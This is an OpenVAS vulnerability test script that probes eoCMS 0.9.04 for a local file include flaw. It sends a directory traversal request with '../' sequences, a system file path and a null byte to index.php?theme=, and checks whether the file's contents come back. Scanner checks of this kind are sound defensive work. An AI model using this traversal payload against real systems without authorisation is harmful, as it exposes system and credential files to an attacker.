###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_eocms_lfi_11_10.nasl 8447 2018-01-17 16:12:19Z teissa $
#
# eoCMS Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "eoCMS is prone to multiple input-validation vulnerabilities, including:

1. An HTML-injection vulnerability
2. An SQL-injection vulnerability
3. Multiple local file-include vulnerabilities

Exploiting these issues could allow an attacker to steal cookie-based
authentication credentials, compromise the application, access or modify data,
exploit latent vulnerabilities in the underlying database, or obtain
potentially sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to compromise the
application and the computer; other attacks are also possible.

eoCMS 0.9.04 is vulnerable; other versions may also be affected.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100881");
 script_version("$Revision: 8447 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-17 17:12:19 +0100 (Wed, 17 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-10-29 12:58:08 +0200 (Fri, 29 Oct 2010)");
 script_bugtraq_id(44640);
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_name("eoCMS Local File Include Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44640");
 script_xref(name : "URL" , value : "https://www.securityfocus.com/archive/1/514633");
 script_xref(name : "URL" , value : "https://www.securityfocus.com/archive/1/514634");
 script_xref(name : "URL" , value : "http://eocms.com/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/eocms", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {

    url = string(dir,"/index.php?theme=",crap(data:"../",length:3*9),files[file],"%00");

    if(http_vuln_check(port:port, url:url, pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );